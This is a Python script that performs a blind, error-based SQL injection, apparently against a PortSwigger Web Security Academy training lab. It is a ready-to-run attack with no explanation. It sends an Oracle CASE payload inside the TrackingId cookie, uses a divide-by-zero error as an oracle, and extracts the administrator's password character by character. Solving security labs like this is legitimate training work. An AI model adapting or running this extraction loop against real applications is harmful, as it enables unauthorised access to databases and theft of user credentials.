import requests
import string

list = string.ascii_lowercase + string.digits
password = ''
counter = 1
URL = 'https://0acf0022031608b7c0d24f9b00210051.web-security-academy.net/'

s = requests.Session()

while counter < 21:
    for char in list:
        COOKIES = dict(TrackingId = "dVZ3P7jhOm6tD5AD'||(select case when substr(password,"+str(counter)+",1)='" + str(char) + "' then TO_CHAR(1/0) else '' end FROM users WHERE username='administrator')||'", session = "ZhZ8JQlAClW7edUAbWAjWFYwr597XV2J")
        r = s.get(url = URL, cookies = COOKIES)
        print(r.status_code, COOKIES)
        if r.status_code == 500:
            password += char
            counter += 1
            print(password,end = '',flush=True)
            break

print("\n\t THE PASSWORD IS: " + password)
